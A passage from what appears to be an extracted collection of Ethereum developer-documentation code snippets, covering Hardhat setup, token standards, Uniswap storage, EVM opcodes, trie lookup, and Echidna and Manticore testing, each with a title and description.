bash\nCODE:\n```\nnpx hardhat\n```\n\n----------------------------------------\n\nTITLE: Importing Chain Configuration for Holesky Testnet\nDESCRIPTION: Importing the predefined chain configuration for the Holesky testnet from Viem's chain definitions.\n\nLANGUAGE: typescript\nCODE:\n```\nimport { holesky } from 'viem/chains'\n```\n\n----------------------------------------\n\nTITLE: Implementing approve Method for ERC-721 in Vyper\nDESCRIPTION: Sets or reaffirms the approved address for a specific NFT. Ensures that only the token owner or an authorized operator can approve another address to transfer the token.\n\nLANGUAGE: python\nCODE:\n```\n@external\ndef approve(_approved: address, _tokenId: uint256):\n    \"\"\"\n    @dev Set or reaffirm the approved address for an NFT. The zero address indicates there is no approved address.\n         Throws unless `msg.sender` is the current NFT owner, or an authorized operator of the current owner.\n         Throws if `_tokenId` is not a valid NFT. (NOTE: This is not written the EIP)\n         Throws if `_approved` is the current owner. (NOTE: This is not written the EIP)\n    @param _approved Address to be approved for the given NFT ID.\n    @param _tokenId ID of the token to be approved.\n    \"\"\"\n    owner: address = self.idToOwner[_tokenId]\n    # Throws if `_tokenId` is not a valid NFT\n    assert owner != ZERO_ADDRESS\n    # Throws if `_approved` is the current owner\n    assert _approved != owner\n```\n\n----------------------------------------\n\nTITLE: Checking Maximum Mint Limit in ERC-4626 Vault\nDESCRIPTION: The maxMint function returns the maximum amount of shares that can be minted by a specific receiver in a single mint call.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction maxMint(address receiver) public view returns (uint256 maxShares)\n```\n\n----------------------------------------\n\nTITLE: Implementing Wallet Event Listener in JavaScript\nDESCRIPTION: A function that listens for wallet account changes in MetaMask and updates the UI accordingly. It detects when users connect, disconnect, or switch accounts and sets appropriate status messages.\n\nLANGUAGE: javascript\nCODE:\n```\nfunction addWalletListener() {\n  if (window.ethereum) {\n    window.ethereum.on(\"accountsChanged\", (accounts) => {\n      if (accounts.length > 0) {\n        setWallet(accounts[0])\n        setStatus(\"👆🏽 Write a message in the text-field above.\")\n      } else {\n        setWallet(\"\")\n        setStatus(\"🦊 Connect to MetaMask using the top right button.\")\n      }\n    })\n  } else {\n    setStatus(\n      <p>\n        {\" \"}\n        🦊 <a target=\"_blank\" href={`https://metamask.io/download.html`}>\n          You must install MetaMask, a virtual Ethereum wallet, in your browser.\n        </a>\n      </p>\n    )\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Installing web3.js via npm for Node.js projects\nDESCRIPTION: Shows the npm command to install web3.js as a dependency in a Node.js project or a frontend project that uses a build system.\n\nLANGUAGE: bash\nCODE:\n```\nnpm install web3 --save\n```\n\n----------------------------------------\n\nTITLE: Initializing Environment Variables for Contract Interaction\nDESCRIPTION: JavaScript code that imports environment variables needed for contract interaction, including API key, private key, and the deployed contract address.\n\nLANGUAGE: javascript\nCODE:\n```\n// interact.js\n\nconst API_KEY = process.env.API_KEY\nconst PRIVATE_KEY = process.env.PRIVATE_KEY\nconst CONTRACT_ADDRESS = process.env.CONTRACT_ADDRESS\n```\n\n----------------------------------------\n\nTITLE: Previewing Withdrawal Result in ERC-4626 Vault\nDESCRIPTION: This method simulates the effect of a withdrawal operation in the current block, allowing users to preview how many shares would be burned to withdraw a specified amount of assets.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction previewWithdraw(uint256 assets) public view returns (uint256 shares)\n```\n\n----------------------------------------\n\nTITLE: Token Reserves Storage in Uniswap V2 Pair\nDESCRIPTION: Stores the reserves for each token type in the pool. These values are used to calculate exchange rates between the tokens.\n\nLANGUAGE: solidity\nCODE:\n```\nuint112 private reserve0;           // uses single storage slot, accessible via getReserves\nuint112 private reserve1;           // uses single storage slot, accessible via getReserves\n```\n\n----------------------------------------\n\nTITLE: PBKDF2-SHA-256 Web3 Secret Storage Test Vector\nDESCRIPTION: A JSON test vector for Web3 Secret Storage using AES-128-CTR and PBKDF2-SHA-256. This example shows the expected format of a stored keyfile with all required fields and their values.\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"crypto\": {\n    \"cipher\": \"aes-128-ctr\",\n    \"cipherparams\": {\n      \"iv\": \"6087dab2f9fdbbfaddc31a909735c1e6\"\n    },\n    \"ciphertext\": \"5318b4d5bcd28de64ee5559e671353e16f075ecae9f99c7a79a38af5f869aa46\",\n    \"kdf\": \"pbkdf2\",\n    \"kdfparams\": {\n      \"c\": 262144,\n      \"dklen\": 32,\n      \"prf\": \"hmac-sha256\",\n      \"salt\": \"ae3cd4e7013836a3df6bd7241b12db061dbe2c6785853cce422d148a624ce0bd\"\n    },\n    \"mac\": \"517ead924a9d0dc3124507e3393d175ce3ff7c1e96529c6c555ce9e51205e9b2\"\n  },\n  \"id\": \"3198bc9c-6672-5ab3-d995-4942343ae5b6\",\n  \"version\": 3\n}\n```\n\n----------------------------------------\n\nTITLE: Retrieving Transactions in a Specific Ethereum Block\nDESCRIPTION: SQL query to fetch all transactions that were included in a specific Ethereum block (12396854). This demonstrates how multiple transactions are grouped into a single block.\n\nLANGUAGE: SQL\nCODE:\n```\nSELECT * FROM ethereum.\"transactions\"\nWHERE block_number = 12396854\nORDER BY block_time DESC\n```\n\n----------------------------------------\n\nTITLE: Initializing Contract Listener with React useEffect\nDESCRIPTION: A React useEffect hook that loads the current message from the contract and initializes the smart contract event listener when the component mounts.\n\nLANGUAGE: javascript\nCODE:\n```\n// HelloWorld.js\n\nuseEffect(async () => {\n  const message = await loadCurrentMessage()\n  setMessage(message)\n  addSmartContractListener()\n}, [])\n```\n\n----------------------------------------\n\nTITLE: Checking Contract Receiver Compatibility in Vyper\nDESCRIPTION: This code checks if the recipient address is a contract and verifies it implements the ERC721Receiver interface by calling onERC721Received and validating the return value. This ensures tokens aren't sent to contracts that can't handle them.\n\nLANGUAGE: python\nCODE:\n```\n    if _to.is_contract: # check if `_to` is a contract address\n```\n\n----------------------------------------\n\nTITLE: Creating Project Structure for Smart Contract Development\nDESCRIPTION: Commands to create the contracts and scripts directories needed for organizing smart contract code and deployment scripts in the NFT project.\n\nLANGUAGE: bash\nCODE:\n```\nmkdir contracts\nmkdir scripts\n```\n\n----------------------------------------\n\nTITLE: Example Recursive Contract Attack in Ethereum\nDESCRIPTION: This code demonstrates a potential recursive contract attack pattern where multiple contracts call each other to create an exponential number of computation steps, potentially circumventing computation limits on individual contracts.\n\nLANGUAGE: solidity\nCODE:\n```\nC0: call(C1); call(C1);\nC1: call(C2); call(C2);\nC2: call(C3); call(C3);\n...\nC49: call(C50); call(C50);\nC50: (run one step of a program and record the change in storage)\n```\n\n----------------------------------------\n\nTITLE: Detecting and enabling MetaMask wallet in browser environments\nDESCRIPTION: Code snippet that detects if the MetaMask Ethereum wallet is available in the browser and requests account access, allowing web applications to interact with the user's Ethereum account.\n\nLANGUAGE: javascript\nCODE:\n```\nif (window.ethereum != null) {\n  state.web3 = new Web3(window.ethereum)\n  try {\n    // Request account access if needed\n    await window.ethereum.enable()\n    // Accounts now exposed\n  } catch (error) {\n    // User denied account access...\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Bitwise Operations in Ethereum EVM\nDESCRIPTION: A reference table of EVM bitwise operations including equality (EQ), zero-checking (ISZERO), logical operations (AND, OR, XOR, NOT), and bit manipulation (BYTE, SHL, SHR, SAR). Each operation is shown with its opcode, gas cost, parameters, and high-level equivalent.\n\nLANGUAGE: markdown\nCODE:\n```\n|   14   | EQ             |                                                3                                                | `a, b`                                           | `a == b`                                     |                                                                               | (u)int256 equality                                                                                                                                                    |\n|   15   | ISZERO         |                                                3                                                | `a`                                              | `a == 0`                                     |                                                                               | (u)int256 iszero                                                                                                                                                      |\n|   16   | AND            |                                                3                                                | `a, b`                                           | `a && b`                             |                                                                               | bitwise AND                                                                                                                                                           |\n|   17   | OR             |                                                3                                                | `a, b`                                           | `a \\|\\| b`                                 |                                                                               | bitwise OR                                                                                                                                                            |\n|   18   | XOR            |                                                3                                                | `a, b`                                           | `a ^ b`                                      |                                                                               | bitwise XOR                                                                                                                                                           |\n|   19   | NOT            |                                                3                                                | `a`                                              | `~a`                                         |                                                                               | bitwise NOT                                                                                                                                                           |\n|   1A   | BYTE           |                                                3                                                | `i, x`                                           | `(x >> (248 - i * 8)) && 0xFF` |                                                                               | `i`th byte of (u)int256 `x`, from the left                                                                                                                            |\n|   1B   | SHL            |                                                3                                                | `shift, val`                                     | `val << shift`                         |                                                                               | shift left                                                                                                                                                            |\n|   1C   | SHR            |                                                3                                                | `shift, val`                                     | `val >> shift`                         |                                                                               | logical shift right                                                                                                                                                   |\n|   1D   | SAR            |                                                3                                                | `shift, val`                                     | `val >> shift`                         |                                                                               | arithmetic shift right                                                                                                                                                |\n```\n\n----------------------------------------\n\nTITLE: Calculating EIP-712 Domain Separator in Solidity\nDESCRIPTION: Computes the domain separator for EIP-712 typed data signing with contract-specific information including name, version, chain ID, and contract address. This ensures signatures are bound to a specific context and contract.\n\nLANGUAGE: solidity\nCODE:\n```\n        DOMAIN_SEPARATOR = keccak256(\n            abi.encode(\n                keccak256('EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)'),\n                keccak256(bytes(name)),\n                keccak256(bytes('1')),\n                chainId,\n                address(this)\n            )\n        );\n    }\n```\n\n----------------------------------------\n\nTITLE: Checking Token Existence in Solidity\nDESCRIPTION: Implements an internal _exists function that verifies if a token exists by checking if its owner address is not the zero address. Used to prevent operations on non-existent tokens.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction _exists(uint256 pizzaId) internal view returns (bool) {\n    address owner = pizzaToOwner[pizzaId];\n    return owner != address(0);\n}\n```\n\n----------------------------------------\n\nTITLE: Running Reth Execution Client with JSON-RPC and Engine Authentication\nDESCRIPTION: Command to start Reth on Ethereum mainnet with JSON-RPC and Engine RPC authentication enabled for connecting to a consensus client. Uses the JWT secret path and restricts calls to localhost.\n\nLANGUAGE: sh\nCODE:\n```\nreth node \\\n    --authrpc.jwtsecret /path/to/jwtsecret \\\n    --authrpc.addr 127.0.0.1 \\\n    --authrpc.port 8551\n```\n\n----------------------------------------\n\nTITLE: Smart Contract with Magic Values Test Case\nDESCRIPTION: A Solidity contract designed to test Echidna's ability to find specific input values that satisfy a sequence of requirements. The contract includes an Echidna property function that returns true until the correct magic values are found.\n\nLANGUAGE: solidity\nCODE:\n```\ncontract C {\n  bool value_found = false;\n  function magic(uint magic_1, uint magic_2, uint magic_3, uint magic_4) public {\n    require(magic_1 == 42);\n    require(magic_2 == 129);\n    require(magic_3 == magic_4+333);\n    value_found = true;\n    return;\n  }\n\n  function echidna_magic_values() public returns (bool) {\n    return !value_found;\n  }\n\n}\n```\n\n----------------------------------------\n\nTITLE: Main Function for Minesweeper Dig Verification in ZoKrates\nDESCRIPTION: The main function for the dig program that generates zero-knowledge proofs for dig results. It takes a private map parameter and coordinates, returns the map hash and either 0xFF if a mine was hit or the count of surrounding mines.\n\nLANGUAGE: zokrates\nCODE:\n```\ndef main(private bool[${width+2}][${height+2}] map, u32 x, u32 y) -> (field, u8) {\n   return (hashMap(map),\n         if map2mineCount(map, x, y) > 0 { 0xFF } else {\n            map2mineCount(map, x-1, y-1) + map2mineCount(map, x, y-1) + map2mineCount(map, x+1, y-1) +\n            map2mineCount(map, x-1, y) + map2mineCount(map, x+1, y) +\n            map2mineCount(map, x-1, y+1) + map2mineCount(map, x, y+1) + map2mineCount(map, x+1, y+1)\n         }\n   );\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Hardhat for Ethereum Development\nDESCRIPTION: A Hardhat configuration file that sets up the development environment for deploying the NFT contract to Ropsten testnet. It loads environment variables for the Alchemy API URL and private key, and configures the Ethereum network connection.\n\nLANGUAGE: javascript\nCODE:\n```\n/**\n* @type import('hardhat/config').HardhatUserConfig\n*/\nrequire('dotenv').config();\nrequire(\"@nomiclabs/hardhat-ethers\");\nconst { API_URL, PRIVATE_KEY } = process.env;\nmodule.exports = {\n   solidity: \"0.8.1\",\n   defaultNetwork: \"ropsten\",\n   networks: {\n      hardhat: {},\n      ropsten: {\n         url: API_URL,\n         accounts: [`0x${PRIVATE_KEY}`]\n      }\n   },\n}\n```\n\n----------------------------------------\n\nTITLE: Executing Named Transactions in Manticore for Ethereum\nDESCRIPTION: This code shows how to execute a specific function by name in a smart contract using Manticore. It demonstrates calling a function 'f' with a symbolic value as an argument.\n\nLANGUAGE: python\nCODE:\n```\nsymbolic_var = m.make_symbolic_value()\ncontract_account.f(symbolic_var, caller=user_account, value=0)\n```\n\n----------------------------------------\n\nTITLE: Getting Maximum Redeem Limit in ERC-4626 Vault\nDESCRIPTION: This method returns the maximum amount of shares that can be redeemed in a single redeem call from the owner's balance.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction maxRedeem(address owner) public view returns (uint256 maxShares)\n```\n\n----------------------------------------\n\nTITLE: Demonstrating Bitcoin Address Format in Blockchain Applications\nDESCRIPTION: This code snippet shows an example of a Bitcoin address hash format that Namecoin and other decentralized protocols aim to improve upon by providing human-readable names.\n\nLANGUAGE: markdown\nCODE:\n```\n`1LW79wp5ZBqaHW1jL5TCiBCrhQYtHagUWy`\n```\n\n----------------------------------------\n\nTITLE: CREATE Opcode (0xF0) Implementation in EVM\nDESCRIPTION: Creates a new contract account with code obtained from memory and returns the new account address. The address is determined by the current account's address and nonce.\n\nLANGUAGE: solidity\nCODE:\n```\naddr = keccak256(rlp([address(this), this.nonce]))\n```\n\n----------------------------------------\n\nTITLE: Retrieving a Node from Ethereum's Merkle Patricia Trie in Python\nDESCRIPTION: Extended code for retrieving a node from the Merkle Patricia Trie using a helper function. It processes the path, navigates through the trie structure, and handles different node types (2-item nodes and 17-item nodes).\n\nLANGUAGE: python\nCODE:\n```\ndef get_helper(node_hash,path):\n    if path == []: return node_hash\n    if node_hash == '': return ''\n    curnode = rlp.decode(node_hash if len(node_hash) < 32 else db.get(node_hash))\n    if len(curnode) == 2:\n        (k2, v2) = curnode\n        k2 = compact_decode(k2)\n        if k2 == path[:len(k2)]:\n            return get(v2, path[len(k2):])\n        else:\n            return ''\n    elif len(curnode) == 17:\n        return get_helper(curnode[path[0]],path[1:])\n\ndef get(node_hash,path):\n    path2 = []\n    for i in range(len(path)):\n        path2.push(int(ord(path[i]) / 16))\n        path2.push(ord(path[i]) % 16)\n    path2.push(16)\n    return get_helper(node_hash,path2)\n```\n\n----------------------------------------\n\nTITLE: Interacting with Ethereum using Web3.py Basic Operations\nDESCRIPTION: Basic examples of using Web3.py to interact with the Ethereum blockchain, including reading the latest block data and sending a transaction with a from address, to address, and value.\n\nLANGUAGE: python\nCODE:\n```\n# read block data:\nw3.eth.get_block('latest')\n\n# send a transaction:\nw3.eth.send_transaction({'from': ..., 'to': ..., 'value': ...})\n```\n\n----------------------------------------\n\nTITLE: Signing and Sending NFT Minting Transaction with Web3.js\nDESCRIPTION: This code demonstrates how to sign an Ethereum transaction using Web3.js to mint an NFT. It loads environment variables, creates a transaction with the appropriate parameters, signs it with a private key, and submits it to the network with error handling.\n\nLANGUAGE: javascript\nCODE:\n```\nrequire(\"dotenv\").config()\nconst API_URL = process.env.API_URL\nconst PUBLIC_KEY = process.env.PUBLIC_KEY\nconst PRIVATE_KEY = process.env.PRIVATE_KEY\n\nconst { createAlchemyWeb3 } = require(\"@alch/alchemy-web3\")\nconst web3 = createAlchemyWeb3(API_URL)\n\nconst contract = require(\"../artifacts/contracts/MyNFT.sol/MyNFT.json\")\nconst contractAddress = \"0x5a738a5c5fe46a1fd5ee7dd7e38f722e2aef7778\"\nconst nftContract = new web3.eth.Contract(contract.abi, contractAddress)\n\nasync function mintNFT(tokenURI) {\n  const nonce = await web3.eth.getTransactionCount(PUBLIC_KEY, \"latest\") //get latest nonce\n\n  //the transaction\n  const tx = {\n    from: PUBLIC_KEY,\n    to: contractAddress,\n    nonce: nonce,\n    gas: 500000,\n    data: nftContract.methods.mintNFT(PUBLIC_KEY, tokenURI).encodeABI(),\n  }\n\n  const signPromise = web3.eth.accounts.signTransaction(tx, PRIVATE_KEY)\n  signPromise\n    .then((signedTx) => {\n      web3.eth.sendSignedTransaction(\n        signedTx.rawTransaction,\n        function (err, hash) {\n          if (!err) {\n            console.log(\n              \"The hash of your transaction is: \",\n              hash,\n              \"\\nCheck Alchemy's Mempool to view the status of your transaction!\"\n            )\n          } else {\n            console.log(\n              \"Something went wrong when submitting your transaction:\",\n              err\n            )\n          }\n        }\n      )\n    })\n    .catch((err) => {\n      console.log(\" Promise failed:\", err)\n    })\n}\n```\n\n----------------------------------------\n\nTITLE: DepositERC20To Function for Transferring to Different Address on L2\nDESCRIPTION: Defines the depositERC20To function which allows transferring ERC-20 tokens from L1 to a specified address on L2. Similar to depositERC20 but with an additional recipient parameter.\n\nLANGUAGE: solidity\nCODE:\n```\n    /**\n     * @dev deposit an amount of ERC20 to a recipient's balance on L2.\n     * @param _l1Token Address of the L1 ERC20 we are depositing\n     * @param _l2Token Address of the L1 respective L2 ERC20\n     * @param _to L2 address to credit the withdrawal to.\n     * @param _amount Amount of the ERC20 to deposit.\n     * @param _l2Gas Gas limit required to complete the deposit on L2.\n     * @param _data Optional data to forward to L2. This data is provided\n     *        solely as a convenience for external contracts. Aside from enforcing a maximum\n     *        length, these contracts provide no guarantees about its content.\n     */\n    function depositERC20To(\n        address _l1Token,\n        address _l2Token,\n        address _to,\n        uint256 _amount,\n        uint32 _l2Gas,\n        bytes calldata _data\n    ) external;\n```\n\n----------------------------------------\n\nTITLE: Example of Enode Format for Ethereum Node\nDESCRIPTION: An example showing the enode URL format that identifies an Ethereum node, including the node ID, IP address, TCP port, and UDP discovery port as a query parameter.\n\nLANGUAGE: plaintext\nCODE:\n```\nenode://6f8a80d14311c39f35f516fa664deaaaa13e85b2f7493f37f6144d86991ec012937307647bd3b9a82abe2974e1407241d54947bbb39763a4cac9f77166ad92a0@10.3.58.6:30303?discport=30301\n```\n\n----------------------------------------\n\nTITLE: Block Validation Algorithm in Blockchain Systems\nDESCRIPTION: A step-by-step algorithm for validating blocks in a blockchain. The process includes checking block references, timestamps, proof of work validity, and applying state transitions for all transactions in sequential order.\n\nLANGUAGE: plaintext\nCODE:\n```\n1. On vérifie que le bloc précédent référencé par le bloc existe et est valide.\n2. On vérifie que l'horodatage du bloc est supérieur à celui du précédent bloc et qu'il n'excède pas 2 heures dans l'avenir.\n3. On vérifie que la preuve de travail du bloc est valide.\n4. `S[0]` doit être l'état à la fin du bloc précédent.\n5. On suppose que `TX` est la liste des transactions du bloc avec `n` transactions. Pour tout `i` dans `0...n-1`, alors `S[i+1] = APPLY(S[i],TX[i])` Si une application renvoie une erreur, sortie et valeur false renvoyée.\n6. La valeur true est renvoyée et `S[n]` est enregistré comme comme état à la fin de ce bloc.\n```\n\n----------------------------------------\n\nTITLE: Constructor for CalldataInterpreter Contract\nDESCRIPTION: Constructor function that initializes the contract with the address of the token it will proxy for.\n\nLANGUAGE: solidity\nCODE:\n```\n    /**\n     * @dev Specify the token address\n     * @param tokenAddr_ ERC-20 contract address\n     */\n    constructor(\n        address tokenAddr_\n    )  {\n        token = OrisUselessToken(tokenAddr_);\n    }   // constructor\n```\n\n----------------------------------------\n\nTITLE: Deposit Event in ERC-4626 Vault\nDESCRIPTION: This event must be emitted when tokens are deposited into the vault via the mint or deposit methods. It tracks the sender, owner, amount of assets, and corresponding shares.\n\nLANGUAGE: solidity\nCODE:\n```\nevent Deposit(\n    address indexed sender,\n    address indexed owner,\n    uint256 assets,\n    uint256 shares\n)\n```\n\n----------------------------------------\n\nTITLE: ERC20 Token Metadata Variables\nDESCRIPTION: These private variables store the metadata for the ERC20 token: the name, symbol, and decimal places. The decimals variable indicates how the token amount should be displayed in user interfaces.\n\nLANGUAGE: solidity\nCODE:\n```\n    string private _name;\n    string private _symbol;\n    uint8 private _decimals;\n```\n\n----------------------------------------\n\nTITLE: Deployment Output Showing Contract Address\nDESCRIPTION: The expected output after successful contract deployment, displaying the deployed contract's address on the Goerli testnet that can be used to interact with or verify the contract.\n\nLANGUAGE: shell\nCODE:\n```\nContract deployed to address: 0x6cd7d44516a20882cEa2DE9f205bF401c0d23570\n```\n\n----------------------------------------\n\nTITLE: Setting ERC-20 Transfer Function Selector in Uniswap V2\nDESCRIPTION: Defines the ABI selector for the ERC-20 transfer function, used to transfer tokens between accounts in the liquidity pool.\n\nLANGUAGE: solidity\nCODE:\n```\nbytes4 private constant SELECTOR = bytes4(keccak256(bytes('transfer(address,uint256)')));\n```\n\n----------------------------------------\n\nTITLE: Executing Raw Transactions in Manticore with Python\nDESCRIPTION: Shows how to execute a raw transaction in Manticore by specifying caller, address, data, and value parameters. These parameters can be concrete or symbolic values.\n\nLANGUAGE: python\nCODE:\n```\nm.transaction(caller=user_account,\n              address=contract_account,\n              data=data,\n              value=value)\n```\n\n----------------------------------------\n\nTITLE: Last Block Timestamp Storage in Uniswap V2\nDESCRIPTION: Stores the timestamp of the last block in which an exchange occurred, used to track exchange rate changes over time.\n\nLANGUAGE: solidity\nCODE:\n```\nuint32  private blockTimestampLast; // uses single storage slot, accessible via getReserves\n```\n\n----------------------------------------\n\nTITLE: Making a JSON-RPC Request with Curl to Fetch Gas Price from Ethereum\nDESCRIPTION: This curl command demonstrates how to make a JSON-RPC request to the Ethereum blockchain through Alchemy's API endpoint to retrieve the current gas price. The request includes the method name 'eth_gasPrice' in the request body.\n\nLANGUAGE: bash\nCODE:\n```\ncurl https://eth-mainnet.alchemyapi.io/v2/demo \\\n-X POST \\\n-H \"Content-Type: application/json\" \\\n-d '{\"jsonrpc\":\"2.0\",\"method\":\"eth_gasPrice\",\"params\":[],\"id\":73}'\n```\n\n----------------------------------------\n\nTITLE: Finalizing ERC-20 Withdrawal Function in Optimism Bridge\nDESCRIPTION: Function signature for finalizing ERC-20 token withdrawals from L2 to L1. It can only be called by the L2 token bridge through the cross-domain messenger system.\n\nLANGUAGE: solidity\nCODE:\n```\n    /**\n     * @inheritdoc IL1ERC20Bridge\n     */\n    function finalizeERC20Withdrawal(\n        address _l1Token,\n        address _l2Token,\n        address _from,\n        address _to,\n        uint256 _amount,\n        bytes calldata _data\n    ) external onlyFromCrossDomainAccount(l2TokenBridge) {\n```\n\n----------------------------------------\n\nTITLE: Defining Liquidity Events in Uniswap\nDESCRIPTION: Events emitted when liquidity providers deposit (Mint) or withdraw (Burn) tokens. These events track the amounts of tokens involved and the accounts interacting with the contract.\n\nLANGUAGE: solidity\nCODE:\n```\nevent Mint(address indexed sender, uint amount0, uint amount1);\nevent Burn(address indexed sender, uint amount0, uint amount1, address indexed to);\n```\n\n----------------------------------------\n\nTITLE: ETH Migration Function for Gateway Upgrade\nDESCRIPTION: A payable function that allows ETH to be migrated from an old gateway contract to a new gateway. This function is temporary, intended for a single upgrade to receive migrated ETH from the old contract.\n\nLANGUAGE: solidity\nCODE:\n```\n/**\n     * @dev Adds ETH balance to the account. This is meant to allow for ETH\n     * to be migrated from an old gateway to a new gateway.\n     * NOTE: This is left for one upgrade only so we are able to receive the migrated ETH from the\n     * old contract\n     */\n    function donateETH() external payable {}\n```\n\n----------------------------------------\n\nTITLE: CALLDATASIZE Opcode in EVM\nDESCRIPTION: The CALLDATASIZE opcode returns the size of the call data in bytes. It takes no inputs from the stack and pushes the length of the message data onto the stack.\n\nLANGUAGE: evm-assembly\nCODE:\n```\nlen(msg.data)\n```\n\n----------------------------------------\n\nTITLE: SELFDESTRUCT Opcode in EVM (French description)\nDESCRIPTION: Destroys the current contract and sends all remaining ETH to the specified address. If executed in the same transaction as contract creation, it destroys the contract.\n\nLANGUAGE: evm assembly\nCODE:\n```\nenvoie tous les ETH vers l'adresse `addr`; si exécuté dans la même transaction qu'un contrat a été créé, détruit le contrat\n```\n\n----------------------------------------\n\nTITLE: EOA Check Modifier for Security\nDESCRIPTION: Defines a modifier that restricts function usage to externally owned accounts (EOAs) only, preventing contracts from accidentally depositing and losing tokens.\n\nLANGUAGE: solidity\nCODE:\n```\n    /**************\n     * Depositing *\n     **************/\n\n    /** @dev Modifier requiring sender to be EOA.  This check could be bypassed by a malicious\n     *  contract via initcode, but it takes care of the user error we want to avoid.\n     */\n    modifier onlyEOA() {\n        // Used to stop deposits from contracts (avoid accidentally lost tokens)\n        require(!Address.isContract(msg.sender), \"Account not EOA\");\n        _;\n    }\n```\n\n----------------------------------------\n\nTITLE: Implementing Smart Contract Event Listener in JavaScript\nDESCRIPTION: JavaScript function that listens for the UpdatedMessages event from the HelloWorld smart contract. It updates the UI state based on the event data, showing either success or error messages depending on the transaction outcome.\n\nLANGUAGE: javascript\nCODE:\n```\n// HelloWorld.js\n\nfunction addSmartContractListener() {\n  helloWorldContract.events.UpdatedMessages({}, (error, data) => {\n    if (error) {\n      setStatus(\"😥 \" + error.message)\n    } else {\n      setMessage(data.returnValues[1])\n      setNewMessage(\"\")\n      setStatus(\"🎉 Your message has been updated!\")\n    }\n  })\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Account Freezing Mapping in Solidity\nDESCRIPTION: Creates a mapping to track which addresses are frozen in the smart contract. The mapping associates addresses with boolean values, where true indicates a frozen account.\n\nLANGUAGE: solidity\nCODE:\n```\nmapping(address => bool) public frozenAccounts;\n```\n\n----------------------------------------\n\nTITLE: RETURN Opcode Implementation (0xF3)\nDESCRIPTION: Returns data from memory to the caller. Terminates execution and returns specified memory segment.\n\nLANGUAGE: solidity\nCODE:\n```\nreturn mem[ost:ost+len-1]\n```\n\n----------------------------------------\n\nTITLE: Implementing Simple Name Registration in Ethereum\nDESCRIPTION: A basic Namecoin-style name registration contract that allows users to register names with associated values in Ethereum's storage. Once a name is registered, it remains in the database permanently. This demonstrates the fundamental concept behind decentralized identity systems.\n\nLANGUAGE: python\nCODE:\n```\ndef register(name, value):\n  if !self.storage[name]:\n    self.storage[name] = value\n```\n\n----------------------------------------\n\nTITLE: Including Apply Now Call-to-Action Component in React/JSX\nDESCRIPTION: A component that provides a call-to-action for users to apply to the Translatathon event.\n\nLANGUAGE: jsx\nCODE:\n```\n<ApplyNow />\n```\n\n----------------------------------------\n\nTITLE: Basic Radix Trie Node Structure in Ethereum\nDESCRIPTION: Shows the structure of a node in a basic radix trie, where i_0 to i_n represent symbols of the alphabet (typically hex), value is the terminal value, and the slots contain either NULL or pointers to other nodes.\n\nLANGUAGE: text\nCODE:\n```\n    [i_0, i_1 ... i_n, value]\n```\n\n----------------------------------------\n\nTITLE: Displaying Spurious Dragon EIPs in an Expandable Card Component\nDESCRIPTION: A React component that displays Spurious Dragon Ethereum Improvement Proposals (EIPs) in an expandable card format. The component lists four EIPs that addressed security issues and optimizations after the DoS attacks of 2016.\n\nLANGUAGE: jsx\nCODE:\n```\n<ExpandableCard title=\"Spurious Dragon EIPs\" contentPreview=\"Official improvements included in this fork.\">\n\n<ul>\n  <li><a href=\"https://eips.ethereum.org/EIPS/eip-155\">EIP-155</a> – <em>verhindert, dass Transaktionen von einer Ethereum-Blockchain wieder auf einer alternativen Blockchain gesendet werden. Beispiel: Eine Testnetz-Transaktion, die auf der Ethereum Haupt-Blockchain wiedergegeben wird.</em></li>\n  <li><a href=\"https://eips.ethereum.org/EIPS/eip-160\">EIP-160</a> – <em>passt Preise des <code>EXP</code>-Verfahrenscodes an – und wirkt somit der Verlangsamung des Netzwerks durch rechenintensive Vertragsklauseln entgegen.</em></li>\n  <li><a href=\"https://eips.ethereum.org/EIPS/eip-161\">EIP-161</a> – <em>ermöglicht das Löschen leerer Konten, die bei DOS-Attacken hinzugefügt wurden.</em></li>\n  <li><a href=\"https://eips.ethereum.org/EIPS/eip-170\">EIP-170</a> – <em>ändert die maximale Codegröße, die ein Vertrag in der Blockchain haben kann, in 24576 Bytes.</em></li>\n</ul>\n\n</ExpandableCard>\n```\n\n----------------------------------------\n\nTITLE: Echidna Configuration with Function Blacklisting\nDESCRIPTION: YAML configuration that blacklists specific functions that would reduce array size, allowing more accurate gas consumption estimation for operations on larger arrays.\n\nLANGUAGE: yaml\nCODE:\n```\nfilterBlacklist: true\nfilterFunctions: [\"pop\", \"clear\"]\n```\n\n----------------------------------------\n\nTITLE: Simple Storage Contract in Serpent for Ethereum\nDESCRIPTION: A basic Serpent contract that checks if a storage location is empty and sets a value at that location. This example shows how contract code interacts with storage in the EVM.\n\nLANGUAGE: py\nCODE:\n```\nif !self.storage[calldataload(0)]:\n  self.storage[calldataload(0)] = calldataload(32)\n```\n\n----------------------------------------\n\nTITLE: Creating a Log Filter with eth_newFilter in JavaScript\nDESCRIPTION: Example of creating a filter object to monitor logs with specific parameters including block range, contract address, and topics. The filter is used to notify when state changes occur in the blockchain.\n\nLANGUAGE: javascript\nCODE:\n```\nparams: [\n  {\n    fromBlock: \"0x1\",\n    toBlock: \"0x2\",\n    address: \"0x8888f1f195afa192cfee860698584c030f4c9db1\",\n    topics: [\n      \"0x000000000000000000000000a94f5374fce5edbc8e2a8697c15331677e6ebf0b\",\n      null,\n      [\n        \"0x000000000000000000000000a94f5374fce5edbc8e2a8697c15331677e6ebf0b\",\n        \"0x0000000000000000000000000aff3454fce5edbc8cca8697c15331677e6ebccc\",\n      ],\n    ],\n  },\n]\n```\n\n----------------------------------------\n\nTITLE: Withdrawing Assets from ERC-4626 Vault\nDESCRIPTION: The withdraw function burns a calculated amount of shares from the owner's balance and sends the specified amount of underlying assets from the vault to the receiver address.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction withdraw(uint256 assets, address receiver, address owner) public returns (uint256 shares)\n```\n\n----------------------------------------\n\nTITLE: Installing dotenv Package for Environment Variables in NFT Minting Project\nDESCRIPTION: Command to install the dotenv package which allows secure storage of API keys and secrets as environment variables in the project.\n\nLANGUAGE: text\nCODE:\n```\nnpm install dotenv --save\n```\n\n----------------------------------------\n\nTITLE: Multi-Byte Cache Key Encoding Test\nDESCRIPTION: Tests the encoding of values with cache keys that require 